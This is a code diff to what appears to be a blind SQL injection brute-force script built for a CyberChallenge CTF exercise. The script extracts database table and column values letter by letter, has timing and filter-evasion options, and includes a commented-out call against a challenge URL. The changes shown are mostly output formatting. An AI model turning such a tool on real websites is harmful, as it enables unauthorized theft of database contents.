@@ -36,7 +36,7 @@ parser.add_argument('--verbosity',
                     default=1,
                     type=int,
                     help='0 for results only'
-                         '1 for verbose, shows trials'
+                         '1 for verbose, shows letter by letter bruteforce'
                          '2 for debug, shows query text')
 parser.add_argument('--charset',
                     default=printable,
@@ -47,8 +47,11 @@ parser.add_argument('--charset',
 args = parser.parse_args(sys.argv[1:])
 charset=list(args.charset)
 
+if(args.where!=''):
+    args.where=" and "+args.where
+
 def remotebf(url,table,column,where="",pingAmpli=1,blacklistevader=False,verbosity=1):
-    print("Working...")
+    print("Working...\n")
     found=[]
     regex = re.compile('[^a-zA-Z]')
     t=0
@@ -81,20 +84,22 @@ def remotebf(url,table,column,where="",pingAmpli=1,blacklistevader=False,verbosi
             i+=1###inc
             if("".join(secret)==last):
                 found.append(last)
+                print()
                 break
             last="".join(secret)
             if(verbosity>=1):
-                print("".join(secret))
+                print("".join(secret)+"\r",end="",flush=True)
         if(last==""):
             print(".:END:.")
             break
         t+=1###inc
-    print("Values found:\n")
-    for x in found:
-        print(x)
+    if(verbosity==0):
+        print("Values found:\n")
+        for x in found:
+            print(x)
 
 try:
     #remotebf(url="http://filtered.challs.cyberchallenge.it/post.php?id=",table="information_schema.columns",column="table_name",where="",pingAmpli=2,verbosity=1)
     remotebf(args.url,args.table,args.column,args.where,args.slow,args.blacklist,args.verbosity)
 except KeyboardInterrupt:
-    pass
+    print("\nKeyboardInterrupt, exiting...")
